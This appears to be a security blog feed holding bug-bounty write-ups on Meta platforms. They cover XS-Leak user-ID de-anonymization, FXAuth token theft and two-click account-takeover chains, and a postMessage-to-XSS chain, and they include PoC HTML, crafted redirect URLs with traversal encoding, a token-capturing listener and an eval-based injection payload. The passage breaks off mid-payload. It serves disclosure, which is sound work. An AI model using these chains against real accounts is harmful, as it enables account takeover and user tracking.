<span class="kd">const</span> <span class="nx">tryUserID</span> <span class="o">=</span> <span class="p">(</span><span class="nx">USER_ID</span><span class="p">)</span> <span class="o">=&gt;</span><span class="p">{</span>
        <span class="nx">frm_id</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">frm_id</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">`https://www.facebook.com/plugins/like.php?app_id=&amp;container_width=0&amp;href=https%3A%2F%2Fysamm.com&amp;layout=button_count&amp;locale=fr_FR&amp;sdk=joey&amp;send=true&amp;show_faces=false&amp;width=450&amp;channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dcc%26is_canvas%3Dtrue%26origin%3Dhttps%253A%252F%252Fysamm.com%26relation%3Dopener&amp;__a=1&amp;__user=</span><span class="p">${</span><span class="nc">Number</span><span class="p">(</span><span class="nx">USER_ID</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span><span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">resolve</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
            <span class="nf">resolve</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>
        <span class="p">},</span><span class="mi">2000</span><span class="p">)</span>
    <span class="p">});</span>
<span class="p">}</span>
<span class="nx">onhashchange</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">user_id</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
    <span class="nf">tryUserID</span><span class="p">(</span><span class="nx">user_id</span><span class="p">).</span><span class="nf">then</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span><span class="nf">alert</span><span class="p">(</span><span class="nx">e</span><span class="p">)})</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h3 id="xs-leak-facebook-user-id-leakage-via-signalsiwljs">XS-Leak: Facebook User ID Leakage via signals/iwl.js</h3>
<hr />
<p><br />
This issue enables direct leakage of the Facebook user ID on third-party origins.</p>

<p>The endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID</code> returns a JavaScript payload intended for internal Meta Pixel testing, which includes the current Facebook user ID.</p>

<p>Although the value is scoped inside a function, it can be extracted by abusing JavaScript prototype manipulation prior to loading the script.</p>

<p>Unlike other XS-Leaks, this technique does not rely on brute-forcing or timing side channels and yields an exact user identifier.</p>

<p>This allows full de-anonymization of Facebook users on third-party websites, enabling cross-site tracking, targeted attacks, and precise user correlation.</p>

<h4 id="poc-1">PoC</h4>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;script&gt;</span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="k">default</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
<span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">e</span><span class="p">.</span><span class="nx">userID</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">)</span> <span class="nf">alert</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">userID</span><span class="p">)</span>
<span class="p">};</span><span class="nb">Function</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">__esModule</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>The endpoint is only accessible when the user is logged in, making login state detection implicit as well.</p>

<h3 id="xs-leak-employee-and-login-state-identification-across-meta-properties">XS-Leak: Employee and Login State Identification Across Meta Properties</h3>
<hr />
<p><br />
This class of issues enables leaking multiple attributes about the current attacker website visitor, including:</p>

<ul>
  <li>Whether the user is logged into Facebook</li>
  <li>Whether the user is logged into Workplace</li>
  <li>Whether the user is logged into work.meta.com</li>
  <li>Whether the user is a Meta employee</li>
  <li>The employee’s Unix username or email prefix</li>
</ul>

<p>The attack relies on probing Meta-owned subdomains such as:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">sb.facebook.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">sb.internalfb.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">my-od.facebook.com</code></li>
  <li><code class="language-plaintext highlighter-rouge">my-od.internalfb.com</code></li>
</ul>

<p>Employee identifiers are reflected in subdomains (for example, www.username.sb.facebook.com).<br />
By brute-forcing subdomains and observing load behavior, an attacker can identify the currently logged-in employee.</p>

<p>For example:</p>

<p><code class="language-plaintext highlighter-rouge">https://www.testemployee.sb.facebook.com/random</code>
<code class="language-plaintext highlighter-rouge">https://www.testemployee.sb.internalfb.com/random</code></p>

<p>This can be combined with XS-Leak primitives (script loading, iframe behavior, or CORB differences) to confirm employee identity.</p>

<p>Additionally, because the <code class="language-plaintext highlighter-rouge">/signals/iwl.js</code> endpoint only loads when logged in, it can be used as a login-state oracle and combined with other probes to build a detailed fingerprint of the user across Meta platforms.</p>

<h1 id="impact">Impact</h1>
<hr />
<p><br />
Collectively, these XS-Leaks enable:</p>

<ul>
  <li>Identification of logged-in Facebook, Workplace, and Meta Work users</li>
  <li>Precise user ID de-anonymization on third-party websites</li>
  <li>Detection of Meta employees and internal account attributes</li>
  <li>Cross-platform fingerprinting without user interaction</li>
</ul>

<h2 id="timeline">Timeline</h2>
<hr />
<p><br />
Dec 29, 2024 — Bug #1 reported</p>

<p>Dec 27, 2024 — Bug #2 reported</p>

<p>Dec 5, 2024 — Bug #3 reported</p>

<p>Dec 29, 2024 — Bug #4 reported</p>

<p>Dec 29, 2024 — Bugs Acknowledged by Meta</p>

<p>May 22, 2025 — Bugs fixed by Meta</p>

<p>Feb 12, 2025 — <strong>$2,400</strong> bounty awarded by Meta for Bug #1</p>

<p>Feb 12, 2025 — <strong>$2,400</strong> bounty awarded by Meta for Bug #2</p>

<p>Feb 12, 2025 — <strong>$3,600</strong> bounty awarded by Meta for Bug #3</p>

<p>Feb 12, 2025 — Meta marked Bug #4 as informative</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction This write-up consolidates several XS-Leak issues discovered across Meta-owned platforms, including Facebook, Workplace, Meta for Work, and internal Meta surfaces.]]></summary></entry><entry><title type="html">Leaking Meta FXAuth Token leading to 2 click Account Takeover</title><link href="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html" rel="alternate" type="text/html" title="Leaking Meta FXAuth Token leading to 2 click Account Takeover" /><published>2026-01-16T00:00:00+02:00</published><updated>2026-01-16T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/16/leaking-fxauth-token.html"><![CDATA[<h1 id="introduction">Introduction</h1>
<hr />
<p><br />
FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.</p>

<p>This write-up documents a redirect flaw in the FXAuth flow that allows the token to be exfiltrated and reused, enabling account linking and takeover in as little as two interactions.</p>

<h1 id="description">Description</h1>
<hr />
<h3 id="the-fxauth-redirect-model">The FXAuth Redirect Model</h3>

<p>The FXAuth flow endpoint for <code class="language-plaintext highlighter-rouge">meta.com</code> is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
</code></pre></div></div>

<p>This endpoint asks for user approval and redirects the browser back to the requestor website ( facebook.com/ instagram.com) with siged <code class="language-plaintext highlighter-rouge">token</code> and <code class="language-plaintext highlighter-rouge">blob</code>. It accepts multiple parameters, including <code class="language-plaintext highlighter-rouge">base_uri</code>:</p>

<p>Originally, <code class="language-plaintext highlighter-rouge">base_uri</code> accepted any arbitrary domain, making token exfiltration trivial. Meta fixed this by restricting the parameter to Meta-owned domains.</p>

<p>However, the fix relied on an incorrect assumption: that restricting the domain alone is sufficient if the attacker cannot directly control the redirect path.</p>

<h3 id="why-the-fix-was-insufficient">Why the Fix Was Insufficient</h3>

<p>While <code class="language-plaintext highlighter-rouge">base_uri</code> was restricted to Meta domains, not all Meta domains are safe.</p>

<p>Legacy surfaces still exist where attackers can execute JavaScript under controlled paths. One such surface is <code class="language-plaintext highlighter-rouge">apps.facebook.com</code>.</p>

<p>Developers can register applications with a namespace that becomes part of the URL:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/{app_namespace}
</code></pre></div></div>

<p>If the attacker owns an application (notably older ones), they regain the ability to read parameters from the URL despite not controlling the base path directly.</p>

<p>This effectively reintroduces the original vulnerability under a different trust boundary.</p>

<h3 id="the-exploitable-fxauth-flow">The Exploitable FXAuth Flow</h3>

<p>A valid FXAuth request accepts:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">app_id</code> belonging to Facebook or Instagram</li>
  <li><code class="language-plaintext highlighter-rouge">flow</code> such as <code class="language-plaintext highlighter-rouge">frlcomet</code> or <code class="language-plaintext highlighter-rouge">frlreauth</code></li>
  <li><code class="language-plaintext highlighter-rouge">etoken</code> generated earlier in an Accounts Center flow</li>
  <li><code class="language-plaintext highlighter-rouge">next</code> restricted to internal paths</li>
  <li><code class="language-plaintext highlighter-rouge">base_uri</code> restricted to Meta-owned domains</li>
</ul>

<p>Example:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://auth.meta.com/fxauth/
?app_id=2220391788200892
<span class="err">&amp;</span>etoken=ATTACKER_ETOKEN
<span class="err">&amp;</span>next=%2Fpersonal_info
<span class="err">&amp;</span>flow=frlcomet
<span class="err">&amp;</span>base_uri=https://apps.facebook.com
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">etoken</code> can be obtained by initiating a standard Accounts Center linking flow:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/?auth_flow=frl_linking&amp;background_page=%2F
</code></pre></div></div>

<h3 id="token-exfiltration">Token Exfiltration</h3>

<p>When the victim opens the crafted FXAuth URL and approves the request, the browser is redirected to:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://apps.facebook.com/personal_info
</code></pre></div></div>

<p>The redirect includes sensitive parameters such as <code class="language-plaintext highlighter-rouge">blob</code> and <code class="language-plaintext highlighter-rouge">token</code>.</p>

<p>Because the attacker controls execution within their application namespace <code class="language-plaintext highlighter-rouge">personal_info</code>, both values can be trivially extracted. At this point, the attacker holds a valid FXAuth token bound to the victim account, he can finalize privileged flows without further user confirmation:</p>

<p>Account linking:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/add/
?auth_flow=frl_linking
&amp;background_page=%2F
&amp;blob=BLOB
&amp;token=TOKEN
</code></pre></div></div>

<p>Action re-authentication bypass:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.facebook.com/profiles/VICTIM_PROFILE_ID/name/
?auth_flow=reauth
&amp;blob=BLOB
&amp;token=TOKEN
</code></pre></div></div>

<p>These flows normally require explicit confirmation. Possession of a valid FXAuth token bypasses that requirement entirely.</p>

<h1 id="impact">Impact</h1>
<hr />
<p><br />
This vulnerability enables linking attacker-controlled accounts, bypassing Accounts Center confirmations, and achieving full account takeover with minimal interaction.</p>

<h2 id="timeline">Timeline</h2>
<hr />
<p><br />
Jun 27, 2023 — Bug reported</p>

<p>Jun 28, 2023 — Bug Acknowledged by Meta</p>

<p>Jun 29, 2023 — <strong>$32,500</strong> bounty awarded by Meta</p>

<p>Dec 29, 2024 Bypass repoted</p>

<p>Apr 28, 2025 — <strong>$32,500</strong> bounty awarded by Meta</p>

<p>Jan 15, 2026 — Bug fixed by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction FXAuth is Meta’s shared authentication system used across Facebook, Instagram, and Meta (Horizon / VR). It is used by Accounts Center for account linking, re-authentication, and sensitive action confirmation.]]></summary></entry><entry><title type="html">Two-click Facebook account takeover via FXAuth token and blob theft</title><link href="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html" rel="alternate" type="text/html" title="Two-click Facebook account takeover via FXAuth token and blob theft" /><published>2026-01-15T00:00:00+02:00</published><updated>2026-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html"><![CDATA[<h2 id="introduction">Introduction</h2>
<hr />
<p><br />
Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.</p>

<p>This integration relies on native SSO flows, FXAuth tokens, and redirect-based handoffs between Facebook and Instagram <code class="language-plaintext highlighter-rouge">accountscenter</code> domains. When these components are not strictly isolated, a single leaked token can be replayed across platforms and escalate into full account compromise.</p>

<p>This report describes a complete attack chain that allows an attacker to link a victim’s Facebook account to the attacker’s Instagram account and gain persistent access.</p>

<h2 id="high-level-impact">High-Level Impact</h2>
<hr />
<p><br />
After successful exploitation, the attacker can:</p>

<ul>
  <li>Link the victim’s Facebook account to the attacker’s Instagram account</li>
  <li>Control Facebook account settings through Accounts Center</li>
  <li>Potentially authenticate into Facebook using Instagram login (mobile)</li>
  <li>Maintain long-term access without Facebook credentials or 2FA</li>
</ul>

<h2 id="descrption">Descrption</h2>
<hr />
<h3 id="accounts-center-native-sso-endpoint">Accounts Center Native SSO Endpoint</h3>

<p>The vulnerability originates from the endpoint <code class="language-plaintext highlighter-rouge">https://www.facebook.com/login/native_sso/</code>. This endpoint is used for cross-app authentication and accepts several parameters, including:</p>

<ul>
  <li>app_id</li>
  <li>token (FXAuth token to be signed)</li>
  <li>extra_data (redirect path)</li>
</ul>

<p>The <code class="language-plaintext highlighter-rouge">extra_data</code> parameter is validated based on the calling application.</p>

<p>For the Instagram application (app_id = <code class="language-plaintext highlighter-rouge">1217981644879628</code>), Facebook historically allowed any redirect path starting with <code class="language-plaintext highlighter-rouge">/accounts_center/</code>. This behavior existed before <code class="language-plaintext highlighter-rouge">accountscenter.instagram.com</code> was introduced.</p>

<p>By abusing double url encoded characters and path traversal, it is possible to escape the intended <code class="language-plaintext highlighter-rouge">/accounts_center/</code> prefix and redirect to any other endpoints while still passing validation.</p>

<p>The following crafted URL demonstrates the bypass:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/login/native_sso/?
<span class="err">&amp;</span>flow=fbcal
<span class="err">&amp;</span>app_id=1217981644879628
<span class="err">&amp;</span>token=FXAUTH_TOKEN
<span class="err">&amp;</span>custom_content_config=accounts_center
<span class="err">&amp;</span>extra_data=/accounts_center/%252%0DE%252%0DE\%252%0DE%252%0DE\/%252%0DE%252%0DE\%252%0DE%252%0DE\any_endpoint
</code></pre></div></div>
<p>After user confirmation, the flow redirects to https://www.instagram.com/any_endpoint</p>

<h3 id="redirect-endpoint--billing_interfacesexternal_result">Redirect endpoint : /billing_interfaces/external_result</h3>

<p>The native SSO flow now could redirect to any endpoint in <code class="language-plaintext highlighter-rouge">www.instagram.com</code>, i managed to find this particular endpoint:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/billing_interfaces/external_result/?
<span class="err">&amp;</span>token=TOKEN
<span class="err">&amp;</span>blob=BLOB
</code></pre></div></div>

<p>This endpoint would try to communicate with its <code class="language-plaintext highlighter-rouge">opener</code> and <code class="language-plaintext highlighter-rouge">parent</code> windows using <code class="language-plaintext highlighter-rouge">postMessage</code> with target origin set to <code class="language-plaintext highlighter-rouge">*</code>. Normally, only limited data is sent. However, when a valid <code class="language-plaintext highlighter-rouge">nonce</code> parameter is added to the endpoint, it would send the <strong>entire URL</strong>, leaking sensitive parameters including:</p>

<ul>
  <li>token</li>
  <li>blob</li>
</ul>

<p>This behavior enables token exfiltration. The <code class="language-plaintext highlighter-rouge">nonce</code> however cannot be guessed and must be generated legitimately for a specific Instagram user. This means that we will need to generate a <code class="language-plaintext highlighter-rouge">nonce</code> for the attacker Instagram account, then force login the instagram account inside the victim’s browser.</p>

<h2 id="attack-flow-summary">Attack Flow Summary</h2>

<hr />
<h3 id="preparation">Preparation</h3>

<h4 id="i---generating-a-valid-nonce-for-the-endpoint">I - Generating a valid nonce for the endpoint</h4>
<hr />
<p><br />
Using an attacker-controlled Instagram account:</p>

<p>1) Visit <code class="language-plaintext highlighter-rouge">https://www.instagram.com/ad_tools/</code></p>

<p>2) Click “Add funds” or “Payment Settings”</p>

<p>3) Capture a request containing an <code class="language-plaintext highlighter-rouge">access_token</code>, to either:</p>
<ul>
  <li>facebook.com/auth/token</li>
  <li>graph.facebook.com</li>
</ul>

<p>4) Use the access token to call the following GraphQL mutation:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://graph.facebook.com/graphql/?
<span class="err">&amp;</span>locale=en_US
<span class="err">&amp;</span>access_token=ACCESS_TOKEN
<span class="err">&amp;</span>variables={
  "input": {
    "country": "US",
    "establish_type": "INIT",
    "logging_data": {
      "logging_counter": 41,
      "logging_id": "3790958217"
    },
    "payment_account_id": "PAYMENT_ACCOUNT_ID",
    "upl_logging_data": {},
    "actor_id": "1",
    "client_mutation_id": "16"
  }
}
<span class="err">&amp;</span>server_timestamps=true
<span class="err">&amp;</span>doc_id=8354858754606667
<span class="err">&amp;</span>method=post
</code></pre></div></div>

<p>Where <code class="language-plaintext highlighter-rouge">PAYMENT_ACCOUNT_ID</code> is obtained from the url:</p>

<p><code class="language-plaintext highlighter-rouge">https://business.facebook.com/billing_hub/payment_settings/?asset_id=PAYMENT_ACCOUNT_ID</code></p>

<p>The response contains a valid nonce value, for example: <code class="language-plaintext highlighter-rouge">hwFlRFhb3krN0rprx16bYLQ2FQ9bpJei</code></p>

<h4 id="ii---instagram-login-csrf">II - Instagram Login CSRF</h4>
<hr />
<p><br />
This can be achieved using Instagram’s email-based login flow. When a user initiates a password reset on Instagram, they receive an email titled:</p>

<p><code class="language-plaintext highlighter-rouge">We’ve made it easy to get back on Instagram</code></p>

<p>The email contains a “Login as USERNAME” link pointing to:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.instagram.com/_n/web_emaillogin?
<span class="err">&amp;</span>uid=ENCODED_UID
<span class="err">&amp;</span>token=LOGIN_NONCE
<span class="err">&amp;</span>auto_send=0
</code></pre></div></div>
<p>Visiting this URL automatically authenticates you in the browser and sets Instagram session cookies without requiring any further interaction. This endpoint acts as a login CSRF primitive.</p>

<h4 id="iii---generating-an-fxauth-token-to-be-signed">III - Generating an FXAuth Token to be signed</h4>
<hr />
<p><br />
The FXAuth token that we will use in this attack needs to be initially generated by the attacker, sent to the victim in the exploit, then use the received <code class="language-plaintext highlighter-rouge">token</code> and <code class="language-plaintext highlighter-rouge">blob</code> , which will be linked to the initial token, to finalize the linking process with the attacker account:</p>

<p>As the attacker:</p>

<p>1) Visit <code class="language-plaintext highlighter-rouge">https://accountscenter.instagram.com/profiles/</code></p>

<p>2) Click “Add account”</p>

<p>3) You get redirected to:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   https://www.facebook.com/login/native_sso/?
   <span class="err">&amp;</span>flow=fbcalcomettest
   <span class="err">&amp;</span>app_id=1217981644879628
   <span class="err">&amp;</span>token=FXAUTH_TOKEN
   <span class="err">&amp;</span>extra_data=%2Fadd%2F%3Fbackground_page%3D%252Fprofiles%252F<span class="err">&amp;</span>custom_content_config=accounts_center
</code></pre></div></div>
<p>4) Extract the <code class="language-plaintext highlighter-rouge">token</code> parameter value and close the page without further interaction.
<br /></p>

<hr />
<h3 id="attack">Attack</h3>
<p>0) Victim visits attackers website</p>

<p>1) The attacker force the victim to login the his Instagram account by loading the Instagram login CSRF URL:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   https://www.instagram.com/_n/web_emaillogin?
   <span class="err">&amp;</span>uid=ENC_UID
   <span class="err">&amp;</span>token=LOGIN_NONCE
   <span class="err">&amp;</span>auto_send=0
</code></pre></div></div>

<p>2) After detecting the login, the attacker’s script opens a new window with the crafted Native SSO URL:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/login/native_sso/?
<span class="err">&amp;</span>flow=fbcal
<span class="err">&amp;</span>app_id=1217981644879628
<span class="err">&amp;</span>token=FXAUTH_TOKEN
<span class="err">&amp;</span>custom_content_config=accounts_center
<span class="err">&amp;</span>extra_data=/accounts_center/%252%0DE%252%0DE\%252%0DE%252%0DE\/%252%0DE%252%0DE\%252%0DE%252%0DE\billing_interfaces\external_result?nonce=ATTACKER_NONCE
</code></pre></div></div>

<p>3) Victim confirms usage of Instagram app</p>

<p>4) The endpoint redirects back to <code class="language-plaintext highlighter-rouge">https://business.facebook.com/billing_interfaces/external_result/?blob=VICTIM_BLOB&amp;token=VICTIM_TOKEN&amp;nonce=ATTACKER_NONCE</code>.</p>

<p>5) The endpoint sends a message via <code class="language-plaintext highlighter-rouge">postMessage</code> to the <code class="language-plaintext highlighter-rouge">opener</code> window containing the full redirect URL</p>

<p>6) The attacker captures the message and extracts blob and token using this example listener</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nf">log_data</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">direct_debit_redirect_url</span><span class="p">);</span>
<span class="p">};</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>7) Using the stolen victim’s <code class="language-plaintext highlighter-rouge">blob</code> and <code class="language-plaintext highlighter-rouge">token</code>, the attacker later navigates to:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://accountscenter.instagram.com/add/?
<span class="err">&amp;</span>background_page=%2Fprofiles%2F
<span class="err">&amp;</span>blob=BLOB
<span class="err">&amp;</span>token=TOKEN
<span class="err">&amp;</span>auth_flow=linking

</code></pre></div></div>
<p>The victim’s Facebook account gets linked to the attacker’s Instagram account. At this point, the attacker gains control through Accounts Center and can manage settings or authenticate via Instagram.</p>

<h2 id="impact">Impact</h2>
<hr />
<p><br />
This vulnerability enables cross-platform account takeover by chaining:</p>

<ul>
  <li>FXAuth token reuse</li>
  <li>Weak redirect validation in native SSO</li>
  <li>Token leakage via postMessage</li>
  <li>Email-based Instagram login CSRF</li>
</ul>

<p>The result is persistent Facebook account compromise without passwords or 2FA.</p>

<h2 id="timeline">Timeline</h2>
<hr />
<p><br />
Oct 16, 2024 — Bug reported</p>

<p>Oct 30, 2024 — Bug Acknowledged by Facebook</p>

<p>Nov 5, 2024 — Bug Fixed by Facebook</p>

<p>Nov 27, 2024 — <strong>$30,000</strong> bounty awarded by Meta</p>]]></content><author><name></name></author><category term="Uncategorized" /><summary type="html"><![CDATA[Introduction Facebook and Instagram accounts are deeply integrated through Accounts Center, allowing users to link identities, share authentication methods, and manage security settings across platforms.]]></summary></entry><entry><title type="html">Self-XSS in Facebook payments flow leads to Instagram and Facebook account takeovers</title><link href="http://localhost:4000/uncategorized/2026/01/15/self-xss-facebook-payments.html" rel="alternate" type="text/html" title="Self-XSS in Facebook payments flow leads to Instagram and Facebook account takeovers" /><published>2026-01-15T00:00:00+02:00</published><updated>2026-01-15T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/15/self-xss-facebook-payments</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/15/self-xss-facebook-payments.html"><![CDATA[<h2 id="introduction">Introduction</h2>
<hr />
<p><br />
Facebook’s payments and billing flows rely heavily on third-party financial service providers.<br />
To facilitate bank-based payments, Facebook embeds external services inside privileged Facebook pages and allows cross-window communication between those services and <code class="language-plaintext highlighter-rouge">facebook.com</code>.</p>

<p>One such integration exists in the <strong>ACH Direct Debit initialization flow</strong>, which embeds <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> inside an iframe on <code class="language-plaintext highlighter-rouge">m.facebook.com</code>.<br />
This integration assumes that messages originating from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> are trustworthy and safe to process.</p>

<p>That assumption turned out to be incorrect. A cross-window message handler on <code class="language-plaintext highlighter-rouge">m.facebook.com</code> accepts specific message types from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> and <strong>directly injects attacker-controlled HTML into the DOM</strong>.<br />
By chaining this behavior with a cross-site scripting vulnerability in <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code>, it becomes possible to achieve <strong>JavaScript execution in the context of <code class="language-plaintext highlighter-rouge">facebook.com</code></strong>.</p>

<p>Once code execution is achieved on Facebook, the attack can be escalated to <strong>Instagram account takeover</strong> through existing OAuth flows.</p>

<h2 id="description">Description</h2>
<hr />
<h3 id="payments">Payments</h3>

<p>The vulnerable Facebook page is <code class="language-plaintext highlighter-rouge">https://m.facebook.com/billing_interfaces/direct_debit_ach_initialization</code></p>

<p>This endpoint:</p>

<ul>
  <li>Embeds an iframe pointing to <code class="language-plaintext highlighter-rouge">https://ThirdPartyPaymentProvider.com</code></li>
  <li>Registers a <code class="language-plaintext highlighter-rouge">message</code> event listener to receive cross-window messages</li>
  <li>Enforces a strict origin check, only accepting messages from <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code></li>
</ul>

<p>At first glance, this seems secure.</p>

<p>However, <strong>origin validation is only as strong as the security of the trusted origin</strong>.</p>

<h3 id="trusting-thirdpartypaymentprovidercom-as-a-security-boundary">Trusting ThirdPartyPaymentProvider.com as a Security Boundary</h3>

<p>The Facebook page registers a cross-window message handler similar to the following logic:</p>

<ul>
  <li>Accept messages only if <code class="language-plaintext highlighter-rouge">event.origin === "https://ThirdPartyPaymentProvider.com"</code></li>
  <li>Parse the message contents</li>
  <li>Handle specific message types</li>
</ul>

<p>One such accepted message type is:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ThirdPartyPaymentProvider.learnMore
</code></pre></div></div>

<p>When this message is received, its payload is <strong>unsafely injected into the DOM</strong> without sanitization.</p>

<p>This creates a critical trust boundary:</p>

<blockquote>
  <p><strong>Any JavaScript execution inside ThirdPartyPaymentProvider.com can send arbitrary HTML to be rendered inside facebook.com</strong></p>
</blockquote>

<h3 id="xss-in-thirdpartypaymentprovidercom">XSS in ThirdPartyPaymentProvider.com</h3>

<p><code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> loads a remote configuration file specified via URL parameters.</p>

<p>By abusing this behavior, it was possible to inject the following payload into the ThirdPartyPaymentProvider context:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">""</span> <span class="na">onerror=</span><span class="s">"onmessage=(e)=&gt;{eval(e.data.cmd)};"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>This turns the <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe into a <strong>message relay</strong>, allowing arbitrary JavaScript commands to be executed inside that origin.</p>

<p>At this point, the attacker controls a trusted <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider.com</code> frame.</p>

<h3 id="triggering-xss-in-facebookcom">Triggering XSS in facebook.com</h3>

<p>Once the <code class="language-plaintext highlighter-rouge">ThirdPartyPaymentProvider</code> iframe is compromised, exploitation becomes trivial.</p>

<p>From the parent window, the attacker sends a message to the compromised iframe:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">postMessage</span><span class="p">({</span>
  <span class="na">cmd</span><span class="p">:</span> <span class="s2">`
    top.frames[1].postMessage(
